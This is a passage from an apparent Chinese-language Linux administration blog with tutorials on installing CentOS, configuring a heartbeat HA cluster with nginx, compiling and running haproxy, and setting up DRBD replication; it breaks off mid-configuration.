    <content type="text"><![CDATA[安装 CentOS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CentOS（Community Enterprise Operating System，中文意思是：社区企业操作系统）是Linux发行版之一，它是来自于Red Hat Enterprise Linux依照开放源代码规定释出的源代码所编译而成。由于出自同样的源代码，因此有些要求高度稳定性的服务器以CentOS替代商业版的Red Hat Enterprise Linux使用。两者的不同，在于CentOS并不包含封闭源代码软件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 安装前准备下载安装包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 是开源的系统，下载资源都应该在官方或者正规的镜像站下载，以保证下载包的安全 CentOS官网。这里下载 CentOS 7 为例. 开始安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入初始化界面，等待检查完就可以进入安装了，不想等待的按 ESC 退出也没有关系。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接着就进入图形安装界面了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语言选择 “中文-简体中文” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择“安装位置”，进行硬盘分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以选择自动分区和手动分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;选择“网络和主机”，设置主机名和网卡IP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入“软件选择”，选择“最小安装” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开始安装 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装过程中可以设置 root 密码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时也可以创建用户。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成重启系统 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启完成登录系统]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HA 集群配置]]></title>
    <url>%2F2017%2F08%2F10%2FHA%E9%9B%86%E7%BE%A4%2F1.%20HA%20%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[HA集群配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HA 即 （high available）高可用，又被叫做双机热备，用于关键性业务。 简单理解就是，有两台机器A和B，正常是A提供服务，B待命闲置，当A宕机或服务宕掉，会切换至B机器继续提供服务。常用实现高可用的开源软件有heartbeat和keepalived，其中keepalived有负载均衡的功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如图所示为一个 HA 结构，一个交换机下面有两台机器 web1 和 web2 ，其中 web1 为主节点，正常是它在提供服务，而 web2 备用节点是闲置的。 web1 和 web2 中间有一根心跳线，检查对方的存活状态。流动 IP ，也叫 vip 是对外提供服务的 ip ，正常情况下，是配置在 web1 上的，当 web1 宕机后， web2 会自动配置该 vip ，对外提供服务。 heartbeat 部署&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面使用 heartbeat 来做 HA 集群，并且把 nginx 服务作为 HA 对应的服务 准备工作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两台机器，都是 centos6.5，网卡 eth0 ip 地址为 12master 192.168.0.69slave 192.168.0.68 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth1 ip 地址为 12master 192.168.91.100slave 192.168.91.101 1. hostname 设置好，分别为 master 和 slave&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主上设置 hostname 123[root@HA1 ~]# hostname master[root@HA1 ~]# bash[root@master ~]# vim /etc/sysconfig/network &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑文件 12NETWORKING=yesHOSTNAME=master &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上设置 hostname 123[root@HA2 ~]# hostname slave[root@HA2 ~]# bash[root@slave ~]# vim /etc/sysconfig/network &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑文件 12NETWORKING=yesHOSTNAME=master 2.关闭防火墙&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主和从上都操作 12iptables -Fservice iptables save &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主和从都关闭 selinux 12setenforce 0sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config 3.配置 hosts&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主和从都编辑 1vim /etc/hosts &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加内容 12192.168.0.69 master192.168.0.68 slave 4.安装 epel 扩展源&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主和从都执行 1yum install -y epel-release 5.安装 heartbeat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主和从都执行 1yum install -y heartbeat* libnet nginx 6.主上（master）配置123[root@master ~]# cd /usr/share/doc/heartbeat-3.0.4/[root@master heartbeat-3.0.4]# cp authkeys ha.cf haresources /etc/ha.d[root@master heartbeat-3.0.4]# cd /etc/ha.d &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后编辑 1[root@master ha.d]# vim authkeys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改 1234#auth 1#1 crc#2 shal HI!#3 md5 Hello! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 1234#auth 3#1 crc#2 shal HI!3 md5 Hello! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是用来验证的 crc 最简单， shal 最复杂。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后修改权限 1[root@master ha.d]# chmod 600 authkeys &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑 haresources 文件 123[root@master ha.d]# vim haresources##nodel 10.0.0.170 Filesystem::/dev/sda1::data1:;ext2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 12#master 192.168.0.70/24/eth0:0 nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：master 为主节点 hostname ，192.168.0.70 为 vip ，/24 为24网段，eth0:0 为 vip 的设备名，nginx 为 heartbeat 监控的服务，也是两台机器对外提供的核心服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后编辑 ha.cf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;清空 ha.cf 12[root@master ha.d]# &gt;ha.cf[root@master ha.d]# vim ha.cf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加内容 1234567891011121314debugfile /var/log/ha-debuglogfile /var/log/ha-loglogfacility local0keepalive 2deadtime 30warntime 10initdead 60udpport 694ucast eth1 192.168.91.101auto_failback onnode masternode slaveping 192.168.91.1respawn hacluster /usr/lib64/heartbeat/ipfail &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置说明： debugfile /var/log/ha-debug：该文件保存 heartbeat 的调试信息; logfile /var/log/ha-log：heartbeat 的日志文件； keepalive 2：心跳的时间间隔，默认时间单位为秒； deadtime 30：超出该时间间隔未收到对方节点的心跳，则认为对方已经死亡； warntime 10：超出该时间间隔未收到对方节点的心跳，则发出警告并记录到日志中； initdead 60：在某些系统上，系统启动或重启之后需要经过一段时间网络才能正常工作，该选项用于解决这种情况产生的时间间隔。取值至少为 deadtime 的两倍； udpport 694：设置广播通信使用的端口， 694 为默认使用的端口； ucast eth1 192.168.91.101：设置为对方机器心跳检测的网卡和 ip； auto_failback on：heartbeat 的两台机器分别为主节点和从节点。主节点在正常情况下占用资源并运行所有的服务，遇到故障时把资源交给从节点并由从节点运行服务。在该选项为 on 的情况下，一旦主节点恢复运行，则自动获取资源并取代从节点，负责不取代从节点； node： 指定主和从，各占一行，主在上从在下； respawn hacluster /usr/lib/heartbeat/ipfail：指定与 heartbeat 一同启动和关闭的进程，该进程被自动监视，遇到故障则重新启动。最常用的进程是 ipfail ，该进程用于检测和处理网络故障，需要配合 ping 语句指定的 ping node 来检测网络连接。如果系统是64，注意该文件的路径/usr/lib64/heartbeat/ipfail。 7.把主上的三个配置文件拷贝到从上12[root@master ~]# cd /etc/ha.d/[root@master ha.d]# scp authkeys ha.cf haresources slave:/etc/ha.d/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;scp 命令安装 1yum -y install openssh-clients &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果提示错误，主从都安装 8.从上（slave）编辑 ha.cf1[root@slave ~]# vim /etc/ha.d/ha.cf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ucast eth1 192.168.91.101 修改为 ucast eth1 192.168.91.100 9.启动 heartbeat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先主，后从 1# service heartbeat start 10.检查测试&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主执行 1[root@master ~]# ifconfig &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看是否有 eth0:0 1[root@master ~]# ps aux | grep nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看是否有 nginx 进程 11.测试1&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主上故意禁 ping 1[root@master ~]# iptables -I INPUT -p icmp -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上执行 1[root@slave ~]# ifconfig &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看是否有 eth0:0 1[root@slave ~]# ps aux | grep nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看是否有 nginx 进程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主上执行 1[root@master ~]# iptables -D INPUT -p icmp -j DROP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主上恢复 eth0:0 和 nginx，从上停止 eth0:0 和 nginx 服务 12.测试2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主上停止 heartbeat 服务 1[root@master ~]# service heartbeat stop &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上会启动 eth0:0 和 nginx 服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主上开启 heartbeat 服务 1[root@master ~]# service heartbeat start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主上恢复 eth0:0 和 nginx 服务，从上停止 eth0:0 和 nginx 服务 13.测试脑裂&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主和从上都 down 掉 eth1 网卡 1ifdown eth1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主和从都会启动 eth0:0 网卡和 nginx 服务]]></content>
      <tags>
        <tag>HA集群</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[haproxy 源码编译安装]]></title>
    <url>%2F2017%2F08%2F10%2FHaproxy%2F6.%20%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%20haproxy%2F</url>
    <content type="text"><![CDATA[源码编译安装 haproxy下载1234567[root@localhost ~]# cd /usr/local/src[root@localhost src]# wget http://www.haproxy.org/download/1.4/src/haproxy-1.4.25.tar.gz[root@localhost src]# yum -y install cmake gcc gcc-c++ autoconf automake zlib* libxml* \ ncurses ncurses-devel libtool-ltdl-devel* make bison bison-devel libaio [root@localhost src]# tar zxvf haproxy-1.4.25.tar.gz [root@localhost src]# cd haproxy-1.4.25 [root@localhost haproxy-1.4.25]# 开始编译安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MAKE 参数参考文件中的 README 文件 1234567891011[root@localhost haproxy-1.4.25]# make TARGET=linux26 PREFIX=/usr/local/haproxy [root@localhost haproxy-1.4.25]# make install PREFIX=/usr/local/haproxy [root@localhost haproxy-1.4.25]# install -d /usr/local/sbin [root@localhost haproxy-1.4.25]# install haproxy /usr/local/sbin [root@localhost haproxy-1.4.25]# install -d /usr/local/share/man/man1 [root@localhost haproxy-1.4.25]# install -m 644 doc/haproxy.1 /usr/local/share/man/man1 [root@localhost haproxy-1.4.25]# install -d /usr/local/doc/haproxy [root@localhost haproxy-1.4.25]# for x in configuration architecture haproxy-en haproxy-fr; do \ &gt; install -m 644 doc/$x.txt /usr/local/doc/haproxy ; \ &gt; done [root@localhost haproxy-1.4.25]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成，检测是否安装成功 123[root@localhost haproxy-1.4.25]# haproxy -v HA-Proxy version 1.4.25 2014/03/27 Copyright 2000-2014 Willy Tarreau &lt;w@1wt.eu&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;则安装成功 配置 haproxy.cfg 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用的 /root/haproxy-1.4.25/examples/haproxy.cfg 这个是自带的配置文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485[root@localhost examples]# vim haproxy.cfg # this config needs haproxy-1.1.28 or haproxy-1.2.1 global log 127.0.0.1 local0 log 127.0.0.1 local1 notice #log loghost local0 info maxconn 4096 # chroot /usr/share/haproxy chroot /usr/local/haproxy uid 99 gid 99 daemon #debug #quiet defaults log global mode http option httplog option dontlognull retries 3 #redispatch maxconn 2000 contimeout 5000 clitimeout 50000 srvtimeout 50000 #============================这一段是后面加上去的。 就是WEB代理 listen web_proxy bind *:80 mode http option httpchk GET /index.html server s1 192.168.11.210:80 weight 3 check server s2 192.168.11.211:80 weight 3 check #后面的我做的注释 #listen appli1-rewrite 0.0.0.0:10001 # cookie SERVERID rewrite # balance roundrobin # server app1_1 192.168.34.23:8080 cookie app1inst1 check inter 2000 rise 2 fall 5 # server app1_2 192.168.34.32:8080 cookie app1inst2 check inter 2000 rise 2 fall 5 # server app1_3 192.168.34.27:8080 cookie app1inst3 check inter 2000 rise 2 fall 5 # server app1_4 192.168.34.42:8080 cookie app1inst4 check inter 2000 rise 2 fall 5 # #listen appli2-insert 0.0.0.0:10002 # option httpchk # balance roundrobin # cookie SERVERID insert indirect nocache # server inst1 192.168.114.56:80 cookie server01 check inter 2000 fall 3 # server inst2 192.168.114.56:81 cookie server02 check inter 2000 fall 3 # capture cookie vgnvisitor= len 32 # # option httpclose # disable keep-alive # rspidel ^Set-cookie:\ IP= # do not let this cookie tell our internal IP address # #listen appli3-relais 0.0.0.0:10003 # dispatch 192.168.135.17:80 # #listen appli4-backup 0.0.0.0:10004 # option httpchk /index.html # option persist # balance roundrobin # server inst1 192.168.114.56:80 check inter 2000 fall 3 # server inst2 192.168.114.56:81 check inter 2000 fall 3 backup # #listen ssl-relay 0.0.0.0:8443 # option ssl-hello-chk # balance source # server inst1 192.168.110.56:443 check inter 2000 fall 3 # server inst2 192.168.110.57:443 check inter 2000 fall 3 # server back1 192.168.120.58:443 backup #listen appli5-backup 0.0.0.0:10005 # option httpchk * # balance roundrobin # cookie SERVERID insert indirect nocache # server inst1 192.168.114.56:80 cookie server01 check inter 2000 fall 3 # server inst2 192.168.114.56:81 cookie server02 check inter 2000 fall 3 # server inst3 192.168.114.57:80 backup check inter 2000 fall 3 # capture cookie ASPSESSION len 32 # srvtimeout 20000 # option httpclose # disable keep-alive # option checkcache # block response if set-cookie &amp; cacheable # rspidel ^Set-cookie:\ IP= # do not let this cookie tell our internal IP address # errorloc 502 http://192.168.114.58/error502.html # errorfile 503 /etc/haproxy/errors/503.http 启动服务123[root@localhost examples]# haproxy -f /root/haproxy-1.4.25/examples/haproxy.cfg [WARNING] 316/220055 (2376) : parsing [/root/haproxy-1.4.25/examples/haproxy.cfg:22]: keyword 'redispatch' is deprecated, please use 'option redispatch' instead. [ALERT] 316/220055 (2376) : [haproxy.main()] Cannot chroot(/usr/local/sbin/haproxy). &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;出现的报错信息，下面我们来解决问题。因为上面配置文件是我改后的，应该没有什么问题。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[ALERT] 316/220055 (2376) : [haproxy.main()] Cannot chroot(/usr/local/sbin/haproxy). &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是配置文件chroot的目录不对，根据我的文档安装改成 chroot /urs/local/haproxy 就可以解决了 执行 mkdir /usr/share/haproxy &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[WARNING] 316/220055 (2376) : parsing [/root/haproxy-1.4.25/examples/haproxy.cfg:22]: keyword &#39;redispatch&#39; is deprecated, please use &#39;option redispatch&#39; instead. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个报错信息是配置文件22行的问题， 我是做了注释掉就可以起动服务了。 注释到相对应的错误行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再次起动服务： 12[root@localhost examples]# haproxy -f /root/haproxy-1.4.25/examples/haproxy.cfg [root@localhost examples]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;没有任何提示，那我们检测一下是否启动成功 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看一下进程信息 123[root@localhost examples]# ps -ef |grep haproxy nobody 3826 1 0 22:38 ? 00:00:00 haproxy -f /root/haproxy-1.4.25/examples/haproxy.cfg root 3837 1260 0 22:38 pts/0 00:00:00 grep haproxy &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进程已经在 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看一下端口信息 123[root@localhost examples]# netstat -anp |grep haproxy tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 3826/haproxy udp 0 0 0.0.0.0:43549 0.0.0.0:* 3826/haproxy &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把配置文件移动到/etc目录下 12[root@localhost examples]# cd /etc/ [root@localhost etc]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制haproxy配置文件到/etc/目录下面 1[root@localhost etc]# cp /root/haproxy-1.4.25/examples/haproxy.cfg haproxy.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再一次查看进程 kill掉。 在用/etc/haproxy.cfg的配置文件启动看看 123456789101112131415[root@localhost etc]# ps -ef | grep haproxy nobody 3826 1 0 22:38 ? 00:00:00 haproxy -f /root/haproxy-1.4.25/examples/haproxy.cfg root 3901 1260 0 22:40 pts/0 00:00:00 grep haproxy [root@localhost etc]# kill 3826 [root@localhost etc]# ps -ef | grep haproxy root 3928 1260 0 22:41 pts/0 00:00:00 grep haproxy ``` &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;已经kill掉进程，进程已经没有在运行了， 我们现在用/etc/haproxy.cfg 来运行服务 ```bash[root@localhost etc]# haproxy -f /etc/haproxy.cfg [root@localhost etc]# ps -ef |grep haproxy.cfg nobody 3959 1 0 22:42 ? 00:00:00 haproxy -f /etc/haproxy.cfg root 3965 1260 0 22:43 pts/0 00:00:00 grep haproxy.cfg &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;已经看到运行成功 设置以服务形式启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目录切换到/etc/init.d 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798[root@localhost etc]# cd /etc/init.d/ [root@localhost init.d]# vi haproxy #!/bin/bash # # haproxy # # chkconfig: 35 85 15 # description: HAProxy is a free, very fast and reliable solution \ # offering high availability, load balancing, and \ # proxying for TCP and HTTP-based applications # processname: haproxy # config: /etc/haproxy.cfg # pidfile: /var/run/haproxy.pid # Source function library. . /etc/rc.d/init.d/functions # Source networking configuration. . /etc/sysconfig/network # Check that networking is up. [ "$NETWORKING" = "no" ] &amp;&amp; exit 0 config="/etc/haproxy.cfg" exec="/usr/local/haproxy/sbin/haproxy" prog=$(basename $exec) [ -e /etc/sysconfig/$prog ] &amp;&amp; . /etc/sysconfig/$prog lockfile=/var/lock/subsys/haproxy check() &#123; $exec -c -V -f $config &#125; start() &#123; $exec -c -q -f $config if [ $? -ne 0 ]; then echo "Errors in configuration file, check with $prog check." return 1 fi echo -n $"Starting $prog: " # start it up here, usually something like "daemon $exec" daemon $exec -D -f $config -p /var/run/$prog.pid retval=$? echo [ $retval -eq 0 ] &amp;&amp; touch $lockfile return $retval &#125; stop() &#123; echo -n $"Stopping $prog: " # stop it here, often "killproc $prog" killproc $prog retval=$? echo [ $retval -eq 0 ] &amp;&amp; rm -f $lockfile return $retval &#125; restart() &#123; $exec -c -q -f $config if [ $? -ne 0 ]; then echo "Errors in configuration file, check with $prog check." return 1 fi stop start &#125; reload() &#123; $exec -c -q -f $config if [ $? -ne 0 ]; then echo "Errors in configuration file, check with $prog check." return 1 fi echo -n $"Reloading $prog: " $exec -D -f $config -p /var/run/$prog.pid -sf $(cat /var/run/$prog.pid) retval=$? echo return $retval &#125; force_reload() &#123; restart &#125; fdr_status() &#123; status $prog &#125; case "$1" in start|stop|restart|reload) $1 ;; force-reload) force_reload ;; checkconfig) check ;; status) fdr_status ;; condrestart|try-restart) [ ! -f $lockfile ] || restart ;; *) echo $"Usage: $0 &#123;start|stop|status|checkconfig|restart|try-restart|reload|force-reload&#125;" exit 2 esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重起服务haproxy 12[root@localhost init.d]# service haproxy restart env: /etc/init.d/haproxy: Permission denied &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个提示。大概是权限问题。下面加上执行权限 12345[root@localhost init.d]# ll haproxy -rw-r--r--. 1 root root 2588 Nov 13 23:02 haproxy [root@localhost init.d]# chmod -R 655 haproxy [root@localhost init.d]# ll haproxy -rw-r-xr-x. 1 root root 2588 Nov 13 23:02 haproxy &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看一下进程是否存在，不存在重起haproxy服务 [root@localhost init.d]# ps -ef | grep haproxy root 7409 1260 0 23:56 pts/0 00:00:00 grep haproxy [root@localhost init.d]# service haproxy restart Stopping haproxy: [FAILED] Starting haproxy: [ OK ] [root@localhost init.d]# ps -ef | grep haproxy nobody 7444 1 0 23:56 ? 00:00:00 /usr/local/haproxy/sbin/haproxy -D -f /etc/haproxy.cfg -p /var/run/haproxy.pid root 7449 1260 0 23:56 pts/0 00:00:00 grep haproxy [root@localhost init.d]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置上面就完成了]]></content>
      <tags>
        <tag>haproxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DRBD安装配置、工作原理及故障恢复]]></title>
    <url>%2F2017%2F08%2F10%2FHA%E9%9B%86%E7%BE%A4%2F4.%20DRBD%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E3%80%81%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D%2F</url>
    <content type="text"><![CDATA[DRBD安装配置、工作原理及故障恢复一、DRBD简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DRBD的全称为：Distributed ReplicatedBlock Device(DRBD)分布式块设备复制,DRBD是由内核模块和相关脚本而构成，用以构建高可用性的集群。其实现方式是通过网络来镜像整个设备。你可以把它看作是一种网络RAID。它允许用户在远程机器上建立一个本地块设备的实时镜像。 二、DRBD是如何工作的呢?&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;(DRBD Primary)负责接收数据，把数据写到本地磁盘并发送给另一台主机(DRBD Secondary)。另一个主机再将数据存到自己的磁盘中。目前，DRBD每次只允许对一个节点进行读写访问，但这对于通常的故障切换高可用集群来说已经足够用了。有可能以后的版本支持两个节点进行读写存取。 三、DRBD与HA的关系&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个DRBD系统由两个节点构成，与HA集群类似，也有主节点和备用节点之分，在带有主要设备的节点上，应用程序和操作系统可以运行和访问DRBD设备（/dev/drbd*）。在主节点写入的数据通过DRBD设备存储到主节点的磁盘设备中，同时，这个数据也会自动发送到备用节点对应的DRBD设备，最终写入备用节点的磁盘设备上，在备用节点上，DRBD只是将数据从DRBD设备写入到备用节点的磁盘中。现在大部分的高可用性集群都会使用共享存储，而DRBD也可以作为一个共享存储设备，使用DRBD不需要太多的硬件的投资。因为它在TCP/IP网络中运行，所以，利用DRBD作为共享存储设备，要节约很多成本，因为价格要比专用的存储网络便宜很多；其性能与稳定性方面也不错 四、DRBD复制模式协议A：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;异步复制协议。一旦本地磁盘写入已经完成，数据包已在发送队列中，则写被认为是完成的。在一个节点发生故障时，可能发生数据丢失，因为被写入到远程节点上的数据可能仍在发送队列。尽管，在故障转移节点上的数据是一致的，但没有及时更新。这通常是用于地理上分开的节点 协议B：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内存同步（半同步）复制协议。一旦本地磁盘写入已完成且复制数据包达到了对等节点则认为写在主节点上被认为是完成的。数据丢失可能发生在参加的两个节点同时故障的情况下，因为在传输中的数据可能不会被提交到磁盘 协议C：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同步复制协议。只有在本地和远程节点的磁盘已经确认了写操作完成，写才被认为完成。没有任何数据丢失，所以这是一个群集节点的流行模式，但I / O吞吐量依赖于网络带宽 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般使用协议C，但选择C协议将影响流量，从而影响网络时延。为了数据可靠性，我们在生产环境使用时须慎重选项使用哪一种协议 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;四、 DRBD工作原理图DRBD是linux的内核的存储层中的一个分布式存储系统，可用使用DRBD在两台Linux服务器之间共享块设备，共享文件系统和数据。类似于一个网络RAID-1的功能，如图所示： 五、环境介绍及安装前准备环境介绍：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统版本：CentOS 6.4_x86_64 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DRBD软件：drbd-8.4.3-33.el6.x86_64 drbd-kmdl-2.6.32-358.el6-8.4.3-33.el6.x86_64 下载地址 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这里两个软件的版本必须使用一致，而drbd-kmdl的版本要与当前系统的版本相对应，当然在实际应用中需要根据自己的系统平台下载符合需要的软件版本;查看系统版本 “uname -r” 安装前准备：1.每个节点的主机名称须跟”uname -n”命令的执行结果一样1234567######NOD1节点执行sed -i 's@\(HOSTNAME=\).*@\1nod1.allen.com@g' /etc/sysconfig/networkhostname nod1.allen.com######NOD2节点执行sed -i 's@\(HOSTNAME=\).*@\1nod2.allen.com@g' /etc/sysconfig/networkhostname nod2.allen.com注释：修改文件须重启系统生效，这里先修改文件然后执行命令修改主机名称可以不用重启 2.两个节点的主机名称和对应的IP地址可以正常解析12345######在NOD1与NOD2节点执行cat &gt; /etc/hosts &lt;&lt; EOF192.168.137.225 nod1.allen.com nod1192.168.137.222 nod2.allen.com nod2EOF 3.配置epel的yum源 下载并安装12######在NOD1与NOD2节点安装rpm -ivh epel-release-6-8.noarch.rpm 4.需要为两个节点分别提供大小相同的分区123456789101112131415161718192021222324######在NOD1节点上创建分区，分区大小必须与NOD2节点保持一样[root@nod1 ~]# fdisk /dev/sdaCommand (m for help): nCommand action e extended p primary partition (1-4)pPartition number (1-4): 3First cylinder (7859-15665, default 7859):Using default value 7859Last cylinder, +cylinders or +size&#123;K,M,G&#125; (7859-15665, default 15665): +2GCommand (m for help): w[root@nod1 ~]# partx /dev/sda #让内核重新读取分区######查看内核有没有识别分区，如果没有需要重新启动，这里没有识别需要重启系统[root@nod1 ~]# cat /proc/partitionsmajor minor #blocks name 8 0 125829120 sda 8 1 204800 sda1 8 2 62914560 sda2 253 0 20971520 dm-0 253 1 2097152 dm-1 253 2 10485760 dm-2 253 3 20971520 dm-3[root@nod1 ~]# reboot 123456789101112131415161718192021222324######在NOD2节点上创建分区，分区大小必须与NOD1节点保持一样[root@nod2 ~]# fdisk /dev/sdaCommand (m for help): nCommand action e extended p primary partition (1-4)pPartition number (1-4): 3First cylinder (7859-15665, default 7859):Using default value 7859Last cylinder, +cylinders or +size&#123;K,M,G&#125; (7859-15665, default 15665): +2GCommand (m for help): w[root@nod2 ~]# partx /dev/sda #让内核重新读取分区######查看内核有没有识别分区，如果没有需要重新启动，这里没有识别需要重启系统[root@nod2 ~]# cat /proc/partitionsmajor minor #blocks name 8 0 125829120 sda 8 1 204800 sda1 8 2 62914560 sda2 253 0 20971520 dm-0 253 1 2097152 dm-1 253 2 10485760 dm-2 253 3 20971520 dm-3[root@nod2 ~]# reboot 六、安装并配置DRBD1.在NOD1与NOD2节点上安装DRBD软件包12345678######NOD1[root@nod1 ~]# ls drbd-*drbd-8.4.3-33.el6.x86_64.rpm drbd-kmdl-2.6.32-358.el6-8.4.3-33.el6.x86_64.rpm[root@nod1 ~]# yum -y install drbd-*.rpm######NOD2[root@nod2 ~]# ls drbd-*drbd-8.4.3-33.el6.x86_64.rpm drbd-kmdl-2.6.32-358.el6-8.4.3-33.el6.x86_64.rpm[root@nod2 ~]# yum -y install drbd-*.rpm 2.查看DRBD配置文件12345678910ll /etc/drbd.conf;ll /etc/drbd.d/-rw-r--r-- 1 root root 133 May 14 21:12 /etc/drbd.conf #主配置文件total 4-rw-r--r-- 1 root root 1836 May 14 21:12 global_common.conf #全局配置文件######查看主配置文件内容cat /etc/drbd.conf######主配置文件中包含了全局配置文件及"drbd.d/"目录下以.res结尾的文件# You 